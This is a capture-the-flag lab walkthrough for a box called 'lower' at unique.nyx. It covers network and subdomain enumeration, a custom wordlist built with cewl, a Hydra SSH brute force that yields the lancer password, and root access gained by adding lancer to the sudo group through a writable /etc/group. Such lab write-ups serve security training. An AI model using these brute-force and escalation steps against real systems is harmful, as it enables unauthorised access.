# 🔍 Network Discovery

Initially, scan the local network to identify active hosts using `arp-scan`:

```bash
$ sudo arp-scan  --localnet
Interface: eth0, type: EN10MB, MAC: 00:0c:29:8d:a8:e2, IPv4: 192.168.29.56
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied

# 🔎 Enumeration

## Nmap Scan

Perform a full TCP port scan:

```bash
$ nmap -n -Pn -sSV -p-  --min-rate 5000  192.168.29.103
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-09 08:14 -0700
Nmap scan report for 192.168.29.103
Host is up (0.0012s latency).

```

### Findings
- Port **22** → SSH  OpenSSH 9.2p1 Debian
- Port **80** → HTTP  Apache httpd 2.4.62

# 🌐 Web Enumeration

Open the target IP in the browser.

### Observation
The website redirected to:

```text
www.unique.nyx
```


<img width="1278" height="585" alt="Screenshot 2026-05-09 212011" src="https://github.com/user-attachments/assets/8cfafd48-0d6e-46a5-9319-9d0000406036" />

This indicates the application uses **virtual hosts** and having trouble finding that site.

---

# 📝 Updating `/etc/hosts`

Add the domain to the local hosts file:

```bash
sudo nano /etc/hosts
```

Add:

```text
127.0.0.1       localhost
127.0.1.1       arc
##############################
192.168.29.103  www.unique.nyx  
##############################
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Save and exit.

---

# 🔍 Subdomain Enumeration

After opening the website again, a redirect loop error appeared:

<img width="981" height="358" alt="Screenshot 2026-05-09 204916" src="https://github.com/user-attachments/assets/bdfb29fe-88c9-4c7e-bdfa-4f6454be7c61" />

```text
The page isn’t redirecting properly
```

This suggested the existence of another subdomain.

Use `ffuf` for subdomain fuzzing and `Seclist's` subdomains-top1million-5000.txt wordlist :

```bash
$ ffuf -u http://www.unique.nyx -H "Host: FUZZ.unique.nyx" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0 

        /'___\  /'___\           /'___\

```

## Result

Our assumption was correct — a subdomain named `tech` exists.
```text
tech.unique.nyx
```

---

# 📝 Add Subdomain to Hosts File

Update `/etc/hosts` again:

```bash
127.0.0.1       localhost
127.0.1.1       arc
##############################
192.168.29.103  www.unique.nyx
192.168.29.103  tech.unique.nyx
##############################
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```

# 🌐 Technology Website

Open:

```text
http://tech.unique.nyx
```

<img width="1471" height="593" alt="Screenshot 2026-05-09 213219" src="https://github.com/user-attachments/assets/f7f17566-12aa-4ce0-99c7-ef3f7df35bd1" />

### Observation
The website displayed:
- Technology company information
- Team member names and roles

Collected usernames from the website:

```text
tom
kathren
lancer
```

Save them into a file:

```bash
echo 'tom\nkathren\nlancer' > users.txt
```

---

# 🔑 Generating Custom Password List

Generate a custom password list using `cewl`:

```bash
cewl http://tech.unique.nyx --with-numbers -w pass.txt
```

This creates a password list based on words found on the website.

---

# 🔓 SSH Brute Force

Use Hydra to brute-force SSH credentials:

```bash
$ hydra -L users.txt -P pass.txt -t 64 ssh://192.168.29.103
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-09 08:30:46
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 642 login tries (l:3/p:214), ~11 tries per task

Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-09 08:31:45
```

## Credentials Found

```text
Username: lancer
Password: NewY0rk
```

---

# 🖥 SSH Access

Login through SSH and Verify User:

```bash
ssh lancer@192.168.29.103
lancer@192.168.29.103's password: 

lancer@lower:~$ id ; hostname
uid=1000(lancer) gid=1000(lancer) grupos=1000(lancer)
lower


```

Successfully logged in as the user `lancer`.
We can also verify that `lancer` belongs to the `users` group.
Next, attempt to use the `sudo` command to check whether the user has root privileges.

---

# 🚫 Sudo Check

Attempt to use sudo:

```bash
lancer@lower:~$ sudo su
[sudo] contraseÃ±a para lancer: 
lancer is not in the sudoers file.
```

## Result

```text
lancer is not in the sudoers file.
```

The user does not currently have sudo privileges.

---

# 🔍 Searching for Writable Files

Search for writable files that may help with privilege escalation:

```bash
lancer@lower:~$ find / -type f -writable 2>/dev/null | grep -ivE "sys|proc|var"
/etc/group
/home/lancer/.profile
/home/lancer/.bash_logout
/home/lancer/.bashrc
```

## Result

```bash
/etc/group
```

This is a critical finding because `/etc/group` controls Linux group memberships.

---

# ⚠️ Writable `/etc/group` Exploitation

View the file contents:

```bash
cat /etc/group
```

### Observation

The `sudo` group exists:

```text
sudo:x:27:
```

Since the file is writable, add the current user (`lancer`) to the sudo group:

```text
sudo:x:27:lancer
```

Save the file and exit.

---

# 🔄 Reconnect SSH Session

Logout and reconnect through SSH.

Verify group membership:

```bash
lancer@lower:~$ id ; hostname
uid=1000(lancer) gid=1000(lancer) grupos=1000(lancer),27(sudo)
lower
```

The user is now part of the `sudo` group.

---

# 👑 Privilege Escalation

Use sudo to become root:

```bash
sudo su
```

Enter password:

```text
NewY0rk
```

## Verification

```bash
root@lower:/home/lancer# id ; hostname
uid=0(root) gid=0(root) grupos=0(root)
lower
```

Successfully escalated privileges to root.

---

# 🏁 Flags

## Locate Flags

```bash
root@lower:/home/lancer# find / -type f -name root.txt -o -name user.txt 2</dev/null
/root/root.txt
/home/lancer/user.txt
```

---

## 📄 User Flag

```bash
cat /home/lancer/user.txt
```

```text
bbb446e708226206823f2f**********
```

---

## 👑 Root Flag

```bash
cat /root/root.txt
```

```text
b2daf29b8bd041ea1787f3**********
```

# 🚀 Key Takeaways

- Virtual hosts and subdomains should always be enumerated.
- Website content can help generate custom password lists.
- Writable system configuration files are highly dangerous.
- Adding a user to the `sudo` group can directly lead to root access.
- Always verify group memberships after gaining initial access.
